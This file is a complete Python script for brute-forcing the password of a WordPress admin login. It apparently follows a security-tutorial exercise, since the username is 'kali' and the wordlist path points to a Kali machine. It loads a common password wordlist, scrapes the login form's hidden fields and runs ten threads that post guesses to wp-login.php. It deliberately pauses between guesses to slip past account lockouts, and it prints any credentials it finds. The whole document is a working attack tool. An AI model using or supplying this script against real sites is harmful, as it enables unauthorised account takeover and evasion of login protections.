# The wordlist for this script can be found at:
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Software/cain-and-abel.txt

from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = "http://somewordpresssite.com/wordpress/wp-login.php"
WORDLIST = '/home/kali/Downloads/cain-and-abel.txt'


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


# This function will receive the HTTP response, parse it, and loop through all parameters.
def get_params(content):
    # Create a dictionary of parameters.
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    # This method performs the brute-forcing in 3 stages
    def web_bruter(self, passwords):
        # Stage 1: Initialization.
        # Initialize a session object using the 'request' library for cookie handling.
        session = requests.Session()
        # Make initial request to retrieve the login form.
        resp0 = session.get(self.url)
        # We pass the raw HTML content to the 'get_params' function
        params = get_params(resp0.content)
        # Replace the username parameter.
        params['log'] = self.username

        # Stage 2: The Loop.
        while not passwords.empty() and not self.found:
            # Start with a sleep to bypass lockouts.
            time.sleep(5)
            # Pop a password from the Queue.
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            # Use the password to populating the parameter dictionary. If there are no passwords, the thread quits.
            params['pwd'] = passwd

            # Stage 3: The request.
            # Make a post with the dictionary at hand.
            resp1 = session.post(self.url, data=params)
            # Test whether the authentication was successful by checking for 'SUCCESS' string defined earlier.
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                print('Done: now cleaning up other threads. . .')
                self.found = True

if __name__ == '__main__':
    words = get_words()
    b = Bruter('kali', TARGET)
    b.run_bruteforce(words)
